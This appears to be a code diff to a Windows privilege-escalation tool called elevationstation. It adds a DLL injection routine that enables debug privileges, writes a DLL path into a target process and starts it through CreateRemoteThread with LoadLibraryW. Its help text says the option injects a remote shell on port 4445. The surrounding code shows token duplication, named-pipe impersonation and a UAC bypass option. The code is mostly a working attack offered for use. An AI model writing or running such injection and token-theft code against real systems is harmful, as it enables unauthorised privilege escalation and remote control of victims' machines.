@@ -225,49 +225,72 @@ BOOL NamedPipeImpersonate()
 }
 
 
-bool MyCreateFileFunc()
+bool D11Inj3ct0r(DWORD pid)
 {
-    cout << "attempting to create a file in a directory we don't have access to...\n";
-    // Open a handle to the file
+    //enable ALL necessary privs!!!
+    setProcessPrivs(SE_DEBUG_NAME);
+    setProcessPrivs(SE_IMPERSONATE_NAME);
+    //priv enable routine complete
+    //BOOL bRet;
+    
+        HANDLE processHandle;
+        PVOID remoteBuffer;
+     
+        wchar_t dllPath[] = TEXT("C:\\Users\\public\\mig2.dll");
 
-    HANDLE hFile = CreateFile(
-        L"C:\\users\\usethis\\NewFile.txt",     // Filename
-        GENERIC_WRITE,          // Desired access
-        FILE_SHARE_READ,        // Share mode
-        NULL,                   // Security attributes
-        CREATE_NEW,             // Creates a new file, only if it doesn't already exist
-        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
-        NULL);                  // Template file handle
+        printf("[+] Opening process handle for PID: %i\n", pid);
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (!processHandle)
+        {
+            printf("[!] Need more priveleges to access...Error Code: %d\n", GetLastError());
+            exit(0);
+        }
 
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        cout << "Failed to open / create file with current access..." << " The specific error code is: " << GetLastError() << "\n";
-        return false;
-    }
-    else
-    {
-        cout << "[+] Created file successfully!!!\n";
-    }
-    cout << "Now trying to write to the file...\n";
-    string strText = "This is a file created by impersonating the 'usethis' user!"; // For C use LPSTR (char*) or LPWSTR (wchar_t*)
-    DWORD bytesWritten;
-    BOOL written = WriteFile(
-        hFile,            // Handle to the file
-        strText.c_str(),  // Buffer to write
-        (DWORD)strText.size(),   // Buffer size
-        &bytesWritten,    // Bytes written
-        NULL);         // Overlapped
+        BOOL bIsWow64 = FALSE;
+        if (!IsWow64Process(processHandle, &bIsWow64)) //execute the API
+        {
+            printf("There was an issue executing the api against this PID...Error Code: %i\n", GetLastError());
+            exit(0);
+        }
 
-    // Close the handle once we don't need it.
+        //printf("%s", bIsWow64 ? "true" : "false");
 
-    if (bytesWritten != 0)
-    {
-        cout << "[+] Data written to file successfully!!!\n";
-        return true;
-    }
-    else
-        return false;
-    CloseHandle(hFile);
+        if (!bIsWow64)
+        {
+            printf("[+] PID %d is 64-bit!\n", pid);
+
+        }
+        else
+        {
+            printf("[!] PID %d is 64-bit and won't work with this program...\n", pid);
+            exit(0);
+
+        }
+
+        printf("[+] Allocating memory in remote process...\n");
+        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+        if (!remoteBuffer)
+        {
+            printf("[!] Couldn't allocate memory: %d\n", GetLastError());
+            exit(0);
+        }
+        printf("[+] Writing memory to remote process...\n");
+        if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL))
+        {
+            printf("[!] couldn't write memory...Error Code: %d\n", GetLastError());
+            exit(0);
+        }
+        printf("[+] Creating remote thread...\n");
+        PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+        if (!CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL))
+        {
+            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
+            exit(0);
+        }
+        printf("[+] Remote Process Injection completed successfully!!!\n");
+        CloseHandle(processHandle);
+
+        return 0;
 }
 
 int CheckProcessIntegrity(DWORD pid)
@@ -495,7 +518,7 @@ int DupThreadToken(DWORD pid)
     HANDLE remoteproc;
     HANDLE hSystemToken;
     HANDLE hSystemTokenDup;
-
+    
     // ImpersonateSelf(SecurityImpersonation);
     remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
     if (remoteproc)
@@ -510,13 +533,14 @@ int DupThreadToken(DWORD pid)
         wprintf(L"[!] OpenProcess(). Error: %d\n", GetLastError());
         Color(7);
     }
+  
     if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2))
     {
         Color(14);
         wprintf(L"[!] OpenProcessToken(). Error: %d\n", GetLastError());
         Color(7);
     }
-
+   
 
     if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
     {
@@ -524,13 +548,14 @@ int DupThreadToken(DWORD pid)
         wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
         Color(7);
     }
+  
     if (SetThreadToken(NULL, hNewToken))
     {
         Color(2);
         printf("[+] Successfully set the thread token!\n");
         Color(7);
     }
-
+    
 
     setThreadPrivs(SE_INCREASE_QUOTA_NAME);     //need this for CreateProcessAsUser!
     setThreadPrivs(SE_ASSIGNPRIMARYTOKEN_NAME); //need this for CreateProcessAsUser!
@@ -550,9 +575,7 @@ int DupThreadToken(DWORD pid)
         wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
         Color(7);
     }
-        
-   
-
+  
     dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
@@ -707,6 +730,7 @@ int DupProcessToken(DWORD pid)
         printf("[+] DuplicateTokenEx success!!!\n");
         Color(7);
     }
+   
     dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
 
@@ -848,12 +872,13 @@ void uacbypass()
 //-WindowStyle hidden 
 void commandlist()
 {
-    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
+    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -dll 'inject remote shell (port: 4445) into process via d11 inj3ct!0n!'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
     printf("usage: elevationstation.exe -p 1234 -cpi\n");
     printf("usage: elevationstation.exe -p 1234 -d\n");
     printf("usage: elevationstation.exe -p 1234 -dt\n");
     printf("usage: elevationstation.exe -np\n");
     printf("usage: elevationstation.exe -uac\n");
+    printf("usage: elevationstation.exe -p 1234 -dll\n");
     printf("usage: elevationstation.exe -lcp\n");
     printf("usage: elevationstation.exe -p 1234 -l\n");
 }
@@ -924,6 +949,12 @@ int main(int argc, char* argv[])
             pid = atoi(argv[2]);
             //CheckProcessIntegrity(pid);
             DupThreadToken(pid);
+            exit(0);
+        }
+        if (strcmp(argv[3], "-dll") == 0)
+        {
+            pid = atoi(argv[2]);
+            D11Inj3ct0r(pid);
             exit(0);
         }
 
